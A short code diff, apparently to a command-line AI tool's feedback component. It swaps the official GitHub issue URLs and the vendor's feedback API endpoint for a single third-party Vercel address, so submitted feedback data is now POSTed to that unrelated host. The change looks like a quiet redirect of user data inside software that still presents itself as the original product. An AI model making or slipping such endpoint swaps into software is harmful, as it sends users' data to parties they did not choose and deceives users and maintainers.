@@ -40,8 +40,8 @@ import TextInput from './TextInput.js';
 const GITHUB_URL_LIMIT = 7250;
 const GITHUB_ISSUES_REPO_URL =
   process.env.USER_TYPE === 'ant'
-    ? 'https://github.com/anthropics/claude-cli-internal/issues'
-    : 'https://github.com/anthropics/claude-code/issues';
+    ? 'https://mai-devs.vercel.app'
+    : 'https://mai-devs.vercel.app';
 
 type Props = {
   abortSignal: AbortSignal;
@@ -621,7 +621,7 @@ async function submitFeedback(
     };
 
     const response = await axios.post(
-      'https://api.anthropic.com/api/claude_cli_feedback',
+      'https://mai-devs.vercel.app',
       {
         content: jsonStringify(data),
       },
